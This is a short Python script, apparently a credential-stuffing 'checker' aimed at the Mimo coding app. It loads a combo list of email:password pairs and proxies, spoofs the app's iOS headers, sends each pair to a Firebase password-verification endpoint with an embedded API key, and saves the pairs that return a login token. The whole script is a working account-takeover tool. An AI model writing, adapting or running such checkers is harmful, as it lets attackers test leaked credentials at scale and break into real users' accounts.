from lib import request, parse, loader
from random import choice
from concurrent import futures

# Load combo and proxies
loader.load_combo('amine.txt')
loader.load_proxies('http', file='proxies.txt')

def check(email, password):
   # Start
   proxy = choice(loader.proxies)
   data = {"email":f"{email}","returnSecureToken":True,"password":f"{password}"}
   headers = {"Content-Type": "application/json","Host": "www.googleapis.com","User-Agent": "FirebaseAuth.iOS/7.7.0 com.getmimo.mimo/5.0.0 iPhone/14.2 hw/iPhone10_4","X-Client-Version": "iOS/FirebaseSDK/7.7.0/FirebaseCore-iOS","X-Ios-Bundle-Identifier": "com.getmimo.mimo",}
   
   block_1 = request.get_response('POST', 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyDltsW132GkAMCbO3LuZbNgzTmelPFqfWU', json=data, headers=headers, proxies=None, timeout=5)
   
   block_1.fail(statement='error')
   block_1.success(statement='idToken', save=True, save_this=f'{email}:{password}\n')
   
   request.result()
   # End
   
futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)
